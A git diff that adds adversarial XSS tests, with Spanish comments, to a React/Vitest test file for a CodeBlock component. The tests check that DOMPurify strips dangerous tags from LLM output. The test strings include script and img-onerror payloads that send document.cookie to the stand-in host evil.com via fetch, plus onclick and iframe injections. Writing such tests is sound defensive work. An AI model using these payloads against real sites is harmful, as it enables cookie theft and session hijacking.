@@ -2,7 +2,9 @@ import { render, screen, waitFor } from '@testing-library/react';
 import { describe, expect, it, vi } from 'vitest';
 import CodeBlock from './CodeBlock';
 
-// Mock de shiki: devuelve HTML con un span que marca el código.
+// Mock de shiki: refleja el input literalmente dentro de un span
+// (simula el caso real donde shiki escapa <, >, etc. pero queremos
+// verificar que la capa de DOMPurify elimina cualquier tag peligroso).
 vi.mock('shiki', () => ({
   createHighlighter: vi.fn().mockResolvedValue({
     codeToHtml: (code: string) => `<pre><code><span class="hl">${code}</span></code></pre>`,
@@ -35,6 +37,52 @@ describe('CodeBlock', () => {
         lang: 'python',
         theme: 'github-dark',
       });
+    });
+  });
+
+  // --- Tests adversariales (XSS via dangerouslySetInnerHTML) ---
+
+  it('elimina <script> que venga del LLM', async () => {
+    const payload = '</span><script>fetch("//evil.com/"+document.cookie)</script>';
+    render(<CodeBlock code={payload} />);
+    await waitFor(() => {
+      expect(document.querySelector('script')).toBeNull();
+    });
+  });
+
+  it('elimina <img onerror> que venga del LLM', async () => {
+    const payload = '<img src=x onerror="fetch(`//evil.com/${document.cookie}`)">';
+    render(<CodeBlock code={payload} />);
+    await waitFor(() => {
+      expect(document.querySelector('img')).toBeNull();
+    });
+  });
+
+  it('elimina event handlers inline como onclick', async () => {
+    const payload = '<a href="#" onclick="alert(1)">click</a>';
+    render(<CodeBlock code={payload} />);
+    await waitFor(() => {
+      const anchors = document.querySelectorAll('a');
+      anchors.forEach((a) => {
+        expect(a.getAttribute('onclick')).toBeNull();
+      });
+    });
+  });
+
+  it('elimina iframes', async () => {
+    const payload = '<iframe src="https://evil.com"></iframe>';
+    render(<CodeBlock code={payload} />);
+    await waitFor(() => {
+      expect(document.querySelector('iframe')).toBeNull();
+    });
+  });
+
+  it('preserva tags permitidos (pre, code, span) y sus clases', async () => {
+    render(<CodeBlock code="const x = 1;" />);
+    await waitFor(() => {
+      expect(document.querySelector('pre')).toBeInTheDocument();
+      expect(document.querySelector('code')).toBeInTheDocument();
+      expect(document.querySelector('span.hl')).toBeInTheDocument();
     });
   });
 });
